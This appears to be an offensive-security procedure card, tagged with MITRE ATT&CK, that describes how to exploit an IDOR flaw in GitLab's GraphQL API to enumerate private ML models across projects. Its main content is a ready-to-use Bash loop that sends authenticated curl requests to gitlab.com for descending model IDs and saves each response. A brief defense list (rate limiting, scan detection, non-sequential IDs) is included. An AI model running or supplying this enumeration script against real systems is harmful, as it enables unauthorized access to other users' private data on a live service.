---
id: proc-gitlab-enumerate-models
tags:
  - enumeration
  - idor
  - model-discovery
  - gitlab
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/gitlab-graphql-get-model]]'
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Data from Information Repositories]]'
  - '[[Gather Victim Host Information]]'
updated_at: '2025-12-14T17:25:47.618Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
  - '[[Gather Victim Host Information]]'
---
# Enumerate-Models-by-ID-Manipulation

## Summary

This procedure enumerates private ML models in GitLab by iteratively modifying guessable incremental IDs in GraphQL queries, allowing discovery of unauthorized models across all projects.

## Description

Due to the lack of authorization on model IDs, attackers can decrement or brute-force IDs (e.g., from 1000401 to lower values) to systematically access models. Each successful query reveals private data, enabling broad reconnaissance of ML experiments. This amplifies the IDOR impact, potentially exposing thousands of models.

## Requirements

1. Base model ID from initial query
2. Authenticated tokens (Cookie, X-Csrf-Token)
3. Scripting capability (e.g., Bash loop with cURL) for automation
4. Tolerance for potential rate limits

## Defense

Defensive measures and detection strategies:

- Rate limit GraphQL queries per user/IP
- Implement sequential ID scanning detection in API logs
- Use non-sequential or hashed IDs for models

## Objectives

1. Discover multiple private models
2. Map ML registry contents across projects
3. Collect IDs for version enumeration

## Instructions

### Step 1: Identify Starting ID

**Context**: Use an observed model ID as the baseline for enumeration.

From a legitimate or guessed query, note the numeric part (e.g., 1000401).

### Step 2: Iterate and Query IDs

**Context**: Loop through decremented IDs, sending GraphQL requests until exhaustion.

**Command** ([[commands/gitlab-graphql-get-model]]):
Adapt the command by changing the 'id' variable (e.g., in a script:
```bash
for id in {1000401..999000}; do
  model_gid="gid://gitlab/Ml::Model/$id"
  curl -X POST 'https://gitlab.com/api/graphql' \
    -H 'Cookie: _gitlab_session=<your-session-cookie>' \
    -H 'X-Csrf-Token: <your-csrf-token>' \
    -H 'Content-Type: application/json' \
    -d "{"operationName":"getModel","variables":{"id":"$model_gid"},"query":"..."}" > model_$id.json
  if [ $(jq '.data.mlModel | length' model_$id.json) -eq 0 ]; then break; fi
done
```

> Successful hits return model data; save responses for analysis, stopping on empty results.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Data from Information Repositories]] Data from Information Repositories
- [[Gather Victim Host Information]] Gather Victim Host Information

### Sub-Techniques


## Commands Used

- [[commands/gitlab-graphql-get-model]]

## Tools Used


## Tags

- enumeration
- idor
- model-discovery
- gitlab
